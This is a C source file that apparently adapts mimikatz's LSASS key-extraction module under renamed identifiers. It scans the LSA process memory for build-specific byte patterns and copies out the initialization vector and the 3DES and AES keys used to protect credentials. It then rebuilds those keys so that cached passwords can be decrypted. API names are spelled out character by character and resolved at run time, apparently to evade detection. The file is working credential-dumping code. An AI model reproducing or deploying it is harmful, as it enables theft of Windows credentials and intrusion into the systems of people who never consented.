#include "my_modules_nt6.h"



NTSTATUS my_m_modules_nt6_KeyInit = STATUS_NOT_FOUND;
const PLSA_PROTECT_MEMORY my_m_modules_nt6_pLProtectMemory = my_m_modules_nt6_LProtectMemory, my_m_modules_nt6_pLUnprotectMemory = my_m_modules_nt6_LUnprotectMemory;
MPW_BCRYPT_GEN_KEY k3Des, kAes;
BYTE InitializationVector[16];

NTSTATUS my_m_modules_nt6_init()
{
	if(!NT_SUCCESS(my_m_modules_nt6_KeyInit))
		my_m_modules_nt6_KeyInit = my_m_modules_nt6_LInitializeProtectedMemory();
	return my_m_modules_nt6_KeyInit;
}

NTSTATUS my_m_modules_nt6_clean()
{
	if(NT_SUCCESS(my_m_modules_nt6_KeyInit))
		my_m_modules_nt6_LCleanupProtectedMemory();
	return STATUS_SUCCESS;
}

NTSTATUS my_m_modules_nt6_LInitializeProtectedMemory()
{
	NTSTATUS status = STATUS_NOT_FOUND;
	ULONG dwSizeNeeded;
	__try
	{
		status = MBCryptOpenAlgorithmProvider(&k3Des.hProvider, BCRYPT_3DES_ALGORITHM, NULL, 0);
		if(NT_SUCCESS(status))
		{
			status = MBCryptSetProperty(k3Des.hProvider, BCRYPT_CHAINING_MODE, (PBYTE) BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
			if(NT_SUCCESS(status))
			{
				status = MBCryptGetProperty(k3Des.hProvider, BCRYPT_OBJECT_LENGTH, (PBYTE) &k3Des.cbKey, sizeof(k3Des.cbKey), &dwSizeNeeded, 0);
				if(NT_SUCCESS(status))
					k3Des.pKey = (PBYTE) LocalAlloc(LPTR, k3Des.cbKey);
			}
		}

		if(NT_SUCCESS(status))
		{
			status = MBCryptOpenAlgorithmProvider(&kAes.hProvider, BCRYPT_AES_ALGORITHM, NULL, 0);
			if(NT_SUCCESS(status))
			{
				status = MBCryptSetProperty(kAes.hProvider, BCRYPT_CHAINING_MODE, (PBYTE) BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
				if(NT_SUCCESS(status))
				{
					status = MBCryptGetProperty(kAes.hProvider, BCRYPT_OBJECT_LENGTH, (PBYTE) &kAes.cbKey, sizeof(kAes.cbKey), &dwSizeNeeded, 0);
					if(NT_SUCCESS(status))
						kAes.pKey = (PBYTE) LocalAlloc(LPTR, kAes.cbKey);
				}
			}
		}
	}
	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
	return status;
}

VOID my_m_modules_nt6_LCleanupProtectedMemory()
{
	__try
	{
		if (k3Des.hProvider)
            MBCryptCloseAlgorithmProvider(k3Des.hProvider, 0);
		if (k3Des.hKey)
		{
            MBCryptDestroyKey(k3Des.hKey);
			LocalFree(k3Des.pKey);
		}

		if (kAes.hProvider)
            MBCryptCloseAlgorithmProvider(kAes.hProvider, 0);
		if (kAes.hKey)
		{
            MBCryptDestroyKey(kAes.hKey);
			LocalFree(kAes.pKey);
		}
	}
	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
	my_m_modules_nt6_KeyInit = STATUS_NOT_FOUND;
}

VOID WINAPI my_m_modules_nt6_LProtectMemory(IN PVOID Buffer, IN ULONG BufferSize)
{
	my_m_modules_nt6_LEncryptMemory((PUCHAR) Buffer, BufferSize, TRUE);
}



NTSTATUS WINAPI MBCryptEncrypt(__inout BCRYPT_KEY_HANDLE hKey, __in_bcount_opt(cbInput) PUCHAR pbInput, 
    __in ULONG cbInput, __in_opt VOID* pPaddingInfo, __inout_bcount_opt(cbIV) PUCHAR pbIV,
    __in ULONG cbIV, __out_bcount_part_opt(cbOutput, *pcbResult) PUCHAR pbOutput, __in ULONG cbOutput, __out ULONG* pcbResult, __in ULONG dwFlags)
{
    char szBcrypt[] = { 'B','c','r','y','p','t','.','d','l','l','\0' };
    char szBCryptEncrypt[] = { 'B','C','r','y','p','t','E','n','c','r','y','p','t','\0' };
    PFN_MBCryptEncrypt pfn_mbcryptencrypt =
        (PFN_MBCryptEncrypt)GetProcAddress(LoadLibraryA(szBcrypt),szBCryptEncrypt);
    if (pfn_mbcryptencrypt)
    {
       return  pfn_mbcryptencrypt(hKey, pbInput, cbInput, pPaddingInfo, pbIV, cbIV, pbOutput, cbOutput,pcbResult, dwFlags);
    }
    return STATUS_UNSUCCESSFUL;
}


NTSTATUS WINAPI MBCryptDecrypt(__inout BCRYPT_KEY_HANDLE hKey, __in_bcount_opt(cbInput) PUCHAR pbInput, __in ULONG cbInput, __in_opt VOID* pPaddingInfo, 
    __inout_bcount_opt(cbIV) PUCHAR pbIV, __in ULONG cbIV, __out_bcount_part_opt(cbOutput, *pcbResult) PUCHAR pbOutput, __in ULONG cbOutput, 
    __out ULONG* pcbResult, __in ULONG dwFlags)
{
    char szBcrypt[] = { 'B','c','r','y','p','t','.','d','l','l','\0' };
    char szBCryptDecrypt[] = { 'B','C','r','y','p','t','D','e','c','r','y','p','t','\0' };
    PFN_BCryptDecrypt pfn_bcryptdecrypt =
        (PFN_BCryptDecrypt)GetProcAddress(LoadLibraryA(szBcrypt), szBCryptDecrypt);
    if (pfn_bcryptdecrypt)
    {
        return  pfn_bcryptdecrypt(hKey, pbInput, cbInput, pPaddingInfo, pbIV, cbIV, pbOutput, cbOutput, pcbResult, dwFlags);
    }
    return STATUS_UNSUCCESSFUL;
}


NTSTATUS WINAPI MBCryptOpenAlgorithmProvider(__out BCRYPT_ALG_HANDLE* phAlgorithm, __in LPCWSTR pszAlgId, __in_opt LPCWSTR pszImplementation, __in ULONG dwFlags)
{
    char szBcrypt[] = { 'B','c','r','y','p','t','.','d','l','l','\0' };
    char szBCryptOpenAlgorithmProvider[] = { 'B','C','r','y','p','t','O','p','e','n','A','l','g','o','r','i','t','h','m','P','r','o','v','i','d','e','r','\0' };
    PFN_BCryptOpenAlgorithmProvider pfn_bcryptopenalgorithmprovider =
        (PFN_BCryptOpenAlgorithmProvider)GetProcAddress(LoadLibraryA(szBcrypt), szBCryptOpenAlgorithmProvider);
    if (pfn_bcryptopenalgorithmprovider)
    {
        return  pfn_bcryptopenalgorithmprovider(phAlgorithm, pszAlgId, pszImplementation, dwFlags);
    }
    return STATUS_UNSUCCESSFUL;
}


NTSTATUS WINAPI MBCryptGetProperty(__in BCRYPT_HANDLE hObject, __in LPCWSTR pszProperty, __out_bcount_part_opt(cbOutput, *pcbResult) PUCHAR pbOutput, __in ULONG cbOutput, __out ULONG* pcbResult, __in ULONG dwFlags)
{
    char szBcrypt[] = { 'B','c','r','y','p','t','.','d','l','l','\0' };
    char szBCryptGetProperty[] = { 'B','C','r','y','p','t','G','e','t','P','r','o','p','e','r','t','y','\0' };
    PFN_BCryptGetProperty pfn_bcryptgetproperty =
        (PFN_BCryptGetProperty)GetProcAddress(LoadLibraryA(szBcrypt), szBCryptGetProperty);
    if (pfn_bcryptgetproperty)
    {
        return  pfn_bcryptgetproperty(hObject, pszProperty, pbOutput, cbOutput,pcbResult, dwFlags);
    }
    return STATUS_UNSUCCESSFUL;
}


NTSTATUS WINAPI MBCryptSetProperty(__inout BCRYPT_HANDLE hObject, __in LPCWSTR pszProperty, __in_bcount(cbInput) PUCHAR pbInput, __in ULONG cbInput, __in ULONG dwFlags)
{
    char szBcrypt[] = { 'B','c','r','y','p','t','.','d','l','l','\0' };
    char szCryptSetProperty[] = {'B', 'C','r','y','p','t','S','e','t','P','r','o','p','e','r','t','y','\0' };
    PFN_BCryptSetProperty pfn_bcryptsetproperty =
        (PFN_BCryptSetProperty)GetProcAddress(LoadLibraryA(szBcrypt), szCryptSetProperty);
    if (pfn_bcryptsetproperty)
    {
        return  pfn_bcryptsetproperty(hObject, pszProperty, pbInput, cbInput,dwFlags);
    }
    return STATUS_UNSUCCESSFUL;

}


NTSTATUS WINAPI MBCryptCloseAlgorithmProvider(__inout BCRYPT_ALG_HANDLE hAlgorithm, __in ULONG dwFlags)
{
    char szBcrypt[] = { 'B','c','r','y','p','t','.','d','l','l','\0' };
    char szBCryptCloseAlgorithmProvider[] = { 'B','C','r','y','p','t','C','l','o','s','e','A','l','g','o','r','i','t','h','m','P','r','o','v','i','d','e','r','\0' };
    PFN_BCryptCloseAlgorithmProvider pfn_bcryptclosealgorithmprovider =
        (PFN_BCryptCloseAlgorithmProvider)GetProcAddress(LoadLibraryA(szBcrypt), szBCryptCloseAlgorithmProvider);
    if (pfn_bcryptclosealgorithmprovider)
    {
        return  pfn_bcryptclosealgorithmprovider(hAlgorithm, dwFlags);
    }
    return STATUS_UNSUCCESSFUL;
}


NTSTATUS WINAPI MBCryptGenerateSymmetricKey(__inout BCRYPT_ALG_HANDLE hAlgorithm, __out BCRYPT_KEY_HANDLE* phKey, __out_bcount_full_opt(cbKeyObject) PUCHAR pbKeyObject,
    __in ULONG cbKeyObject, __in_bcount(cbSecret) PUCHAR pbSecret, __in ULONG cbSecret, __in ULONG dwFlags)
{
    
    char szBcrypt[] = { 'B','c','r','y','p','t','.','d','l','l','\0' };
    char szBCryptGenerateSymmetricKey[] = { 'B','C','r','y','p','t','G','e','n','e','r','a','t','e','S','y','m','m','e','t','r','i','c','K','e','y','\0' };
    PFN_BCryptGenerateSymmetricKey pfn_bcryptgeneratesymmetrickey =
        (PFN_BCryptGenerateSymmetricKey)GetProcAddress(LoadLibraryA(szBcrypt), szBCryptGenerateSymmetricKey);
    if (pfn_bcryptgeneratesymmetrickey)
    {
        return  pfn_bcryptgeneratesymmetrickey(hAlgorithm, phKey, pbKeyObject, cbKeyObject, pbSecret, cbSecret,dwFlags);
    }
    return STATUS_UNSUCCESSFUL;
}


NTSTATUS WINAPI MBCryptDestroyKey(__inout BCRYPT_KEY_HANDLE hKey)
{
    
    char szBcrypt[] = { 'B','c','r','y','p','t','.','d','l','l','\0' };
    char szBCryptDestroyKey[] = { 'B','C','r','y','p','t','D','e','s','t','r','o','y','K','e','y','\0' };
    PFN_BCryptDestroyKey pfn_bcryptdestroykey =
        (PFN_BCryptDestroyKey)GetProcAddress(LoadLibraryA(szBcrypt), szBCryptDestroyKey);
    if (pfn_bcryptdestroykey)
    {
        return  pfn_bcryptdestroykey(hKey);
    }
    return STATUS_UNSUCCESSFUL;
}

VOID WINAPI my_m_modules_nt6_LUnprotectMemory(IN PVOID Buffer, IN ULONG BufferSize)
{
	my_m_modules_nt6_LEncryptMemory((PUCHAR) Buffer, BufferSize, FALSE);
}

NTSTATUS my_m_modules_nt6_LEncryptMemory(PUCHAR pMemory, ULONG cbMemory, BOOL Encrypt)
{
	NTSTATUS status = STATUS_NOT_FOUND;
	BCRYPT_KEY_HANDLE *hKey;
	BYTE LocalInitializationVector[16];
	ULONG cbIV, cbResult;
	PBCRYPT_ENCRYPT cryptFunc = Encrypt ? MBCryptEncrypt : MBCryptDecrypt;
	RtlCopyMemory(LocalInitializationVector, InitializationVector, sizeof(InitializationVector));
	if(cbMemory % 8)
	{
		hKey = &kAes.hKey;
		cbIV = sizeof(InitializationVector);
	}
	else
	{
		hKey = &k3Des.hKey;
		cbIV = sizeof(InitializationVector) / 2;
	}
	__try
	{
		status = cryptFunc(*hKey, pMemory, cbMemory, 0, LocalInitializationVector, cbIV, pMemory, cbMemory, &cbResult, 0);
	}
	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
	return status;
}

NTSTATUS my_m_modules_nt6_acquireKeys(PMY_M_MODULES_CONTEXT cLs, PPW_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsLSrvModule)
{
#if  defined(_M_X64)
    BYTE PTRN_WNO8_LInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d };
    BYTE PTRN_WIN8_LInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d };
    BYTE PTRN_WN10_LInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
    PW_M_PATCH_GENERIC PTRN_WIN8_LInitializeProtectedMemory_KeyRef[] = {
        {PW_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_LInitializeProtectedMemory_KEY),	PTRN_WNO8_LInitializeProtectedMemory_KEY}, {0, NULL}, {63, -69, 25}},
        {PW_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_LInitializeProtectedMemory_KEY),	PTRN_WNO8_LInitializeProtectedMemory_KEY}, {0, NULL}, {59, -61, 25}},
        {PW_M_WIN_BUILD_8,		{sizeof(PTRN_WIN8_LInitializeProtectedMemory_KEY),	PTRN_WIN8_LInitializeProtectedMemory_KEY}, {0, NULL}, {62, -70, 23}},
        {PW_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WN10_LInitializeProtectedMemory_KEY),	PTRN_WN10_LInitializeProtectedMemory_KEY}, {0, NULL}, {61, -73, 16}},
        {PW_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_LInitializeProtectedMemory_KEY),	PTRN_WN10_LInitializeProtectedMemory_KEY}, {0, NULL}, {67, -89, 16}},
};
#elif defined _M_IX86
    BYTE PTRN_WALL_LInitializeProtectedMemory_KEY[] = { 0x6a, 0x02, 0x6a, 0x10, 0x68 };
    PW_M_PATCH_GENERIC PTRN_WIN8_LInitializeProtectedMemory_KeyRef[] = { // InitializationVector, h3DesKey, hAesKey
        {PW_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WALL_LInitializeProtectedMemory_KEY),	PTRN_WALL_LInitializeProtectedMemory_KEY}, {0, NULL}, {5, -76, -21}},
        {PW_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_LInitializeProtectedMemory_KEY),	PTRN_WALL_LInitializeProtectedMemory_KEY}, {0, NULL}, {5, -69, -18}},
        {PW_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WALL_LInitializeProtectedMemory_KEY),	PTRN_WALL_LInitializeProtectedMemory_KEY}, {0, NULL}, {5, -79, -22}}, // post 11/11
        {PW_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WALL_LInitializeProtectedMemory_KEY),	PTRN_WALL_LInitializeProtectedMemory_KEY}, {0, NULL}, {5, -79, -22}},
    };
#endif

	NTSTATUS status = STATUS_NOT_FOUND;
	PW_M_MEMORY_ADDRESS aLsMemory = {NULL, cLs->hLsMem}, aLocalMemory = {NULL, &PW_M_MEMORY_GLOBAL_OWN_HANDLE};
	PW_M_MEMORY_SEARCH sMemory = {{{lsLSrvModule->DllBase.address, cLs->hLsMem}, lsLSrvModule->SizeOfImage}, NULL};
#if defined(_M_X64)
	LONG offset64;
#endif
	PPW_M_PATCH_GENERIC currentReference;
	if (currentReference = pw_m_patch_getGenericFromBuild(PTRN_WIN8_LInitializeProtectedMemory_KeyRef, ARRAYSIZE(PTRN_WIN8_LInitializeProtectedMemory_KeyRef), cLs->osContext.BuildNumber))
	{
		aLocalMemory.address = currentReference->Search.Pattern;
		if(pw_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
		{
			aLsMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0;
            #if defined(_M_X64)
			aLocalMemory.address = &offset64;
			if(pw_m_memory_copy(&aLocalMemory, &aLsMemory, sizeof(LONG)))
			{
				aLsMemory.address = (PBYTE) aLsMemory.address + sizeof(LONG) + offset64;
			#elif defined(_M_IX86)
			aLocalMemory.address = &aLsMemory.address;
			if(pw_m_memory_copy(&aLocalMemory, &aLsMemory, sizeof(PVOID)))
			{
			#endif
				aLocalMemory.address = InitializationVector;
				if(pw_m_memory_copy(&aLocalMemory, &aLsMemory, sizeof(InitializationVector)))
				{
					aLsMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off1;
					if (my_m_modules_nt6_acquireKey(&aLsMemory, &cLs->osContext, &k3Des,0))
					{
						aLsMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off2;
						if(my_m_modules_nt6_acquireKey(&aLsMemory, &cLs->osContext, &kAes,0))
							status = STATUS_SUCCESS;
					}
				}
			}
		}
	}
	return status;
}

BOOL my_m_modules_nt6_acquireKey(PPW_M_MEMORY_ADDRESS aLsMemory, PMY_M_MODULES_OS_CONTEXT pOs, PMPW_BCRYPT_GEN_KEY pGenKey, LONG armOffset) // TODO:ARM64
{
	BOOL status = FALSE;
	PW_M_MEMORY_ADDRESS aLocalMemory = {&aLsMemory->address, &PW_M_MEMORY_GLOBAL_OWN_HANDLE};
	MPW_BCRYPT_HANDLE_KEY hKey; PMPW_HARD_KEY pHardKey;
	PVOID buffer; SIZE_T taille; LONG offset;

	if(pOs->BuildNumber < PW_M_WIN_MIN_BUILD_8)
	{
		taille = sizeof(MPW_BCRYPT_KEY);
		offset = FIELD_OFFSET(MPW_BCRYPT_KEY, hardkey);
	}
	else if(pOs->BuildNumber < PW_M_WIN_MIN_BUILD_BLUE)
	{
		taille = sizeof(MPW_BCRYPT_KEY8);
		offset = FIELD_OFFSET(MPW_BCRYPT_KEY8, hardkey);
	}
	else
	{
		taille = sizeof(MPW_BCRYPT_KEY81);
		offset = FIELD_OFFSET(MPW_BCRYPT_KEY81, hardkey);
	}


	if(buffer = LocalAlloc(LPTR, taille))
	{

	#if defined(_M_X64)
		LONG offset64;
		aLocalMemory.address = &offset64;
		if(pw_m_memory_copy(&aLocalMemory, aLsMemory, sizeof(LONG)))
		{
			aLsMemory->address = (PBYTE) aLsMemory->address + sizeof(LONG) + offset64;
			aLocalMemory.address = &aLsMemory->address;
	#elif defined(_M_IX86)
		if(pw_m_memory_copy(&aLocalMemory, aLsMemory, sizeof(PVOID)))
		{
	#endif
			if(pw_m_memory_copy(&aLocalMemory, aLsMemory, sizeof(PVOID)))
			{
				aLocalMemory.address = &hKey;
				if(pw_m_memory_copy(&aLocalMemory, aLsMemory, sizeof(MPW_BCRYPT_HANDLE_KEY)) && hKey.tag == 'UUUR')
				{
					aLocalMemory.address = buffer; aLsMemory->address = hKey.key;
					if(pw_m_memory_copy(&aLocalMemory, aLsMemory, taille) && ((PMPW_BCRYPT_KEY) buffer)->tag == 'MSSK') // same as 8
					{
						pHardKey = (PMPW_HARD_KEY) ((PBYTE) buffer + offset);
						if(aLocalMemory.address = LocalAlloc(LPTR, pHardKey->cbSecret))
						{
							aLsMemory->address = (PBYTE) hKey.key + offset + FIELD_OFFSET(MPW_HARD_KEY, data);
							if(pw_m_memory_copy(&aLocalMemory, aLsMemory, pHardKey->cbSecret))
							{
								__try
								{
									status = NT_SUCCESS(MBCryptGenerateSymmetricKey(pGenKey->hProvider, &pGenKey->hKey, pGenKey->pKey, pGenKey->cbKey, (PUCHAR) aLocalMemory.address, pHardKey->cbSecret, 0));
								}
								__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
							}
							LocalFree(aLocalMemory.address);
						}
					}
				}
			}
		}
		LocalFree(buffer);
	}
	return status;
}